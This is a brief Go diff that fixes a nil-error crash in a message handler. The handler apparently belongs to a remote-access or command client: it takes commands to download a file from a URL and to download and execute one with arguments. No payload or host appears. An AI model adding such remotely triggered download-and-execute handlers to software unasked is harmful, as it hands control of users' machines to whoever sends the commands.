@@ -58,7 +58,10 @@ func HandleMessageWithPayload(messageID byte, decoder *gob.Decoder) (responseID 
 			log.Printf("error decoding: %s", err)
 			return types.ERR_GOB, nil
 		}
-		res.Error = modules.DownloadFile(req.Url, req.Location).Error()
+		result := modules.DownloadFile(req.Url, req.Location)
+		if result != nil {
+				res.Error = result.Error()
+		}
 		return types.RES_DOWNLOAD_FILE, res
 	}
 
@@ -70,7 +73,10 @@ func HandleMessageWithPayload(messageID byte, decoder *gob.Decoder) (responseID 
 			log.Printf( "error decoding: %s", err)
 			return types.ERR_GOB, nil
 		}
-		res.Error = modules.DownloadAndExecute(req.Url, req.Args).Error()
+		result := modules.DownloadAndExecute(req.Url, req.Args)
+		if result != nil {
+			res.Error = result.Error()
+		}
 		return types.RES_DOWNLOAD_EXECUTE, res
 	}
 
